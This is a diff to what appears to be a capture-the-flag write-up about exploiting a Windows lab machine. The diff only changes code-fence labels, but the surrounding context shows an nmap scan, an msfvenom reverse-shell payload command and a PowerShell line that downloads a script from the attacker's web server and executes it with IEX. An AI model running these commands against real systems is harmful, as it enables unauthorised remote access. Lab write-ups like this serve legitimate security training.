@@ -21,7 +21,7 @@ some of the tools or frameworks I will be using during this post are th followin
 
 So after all the talk above, and  once we got the machine running (again, from discord, really cool stuff), we got an IP address so we can run the usual nmap, as shown below.
 
-```
+```cmd
 # Nmap 7.94 scan initiated Sat Jun 24 01:17:24 2023 as: nmap -Pn -sV -sC -oN portscan.txt 10.10.88.129
 Nmap scan report for 10.10.88.129
 Host is up (0.24s latency).
@@ -443,7 +443,7 @@ We can corroborate our chain is working using the debugger. We should stop befor
 
 Yay! Now we can execute on the stack (we can confirm by executing on the debugger). We also can control the execution to point to our desired Shellcode, so we can send a reverse shell. At the time, I used the following msfvenom command to generate it.
 
-```
+```cmd
 msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b"\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
 ```
 
@@ -484,7 +484,7 @@ C:\shared>
 
 After going for the user flag (LOL) we can escalate privileges to get an admin shell. For that, we check our privileges and groups using __whoami /all__ we'll receive an output similar to the one below.
 
-```
+```cmd
 C:\shared>whoami /all
 whoami /all
 
@@ -531,7 +531,7 @@ We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. 
 
 We then can host the shell in a Python web server and execute PowerShell in our shell and download and execute the meterpreter reverse shell with the followign command
 
-```
+```cmd
 (new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
 ```
 Now we got a meterpreter session. 
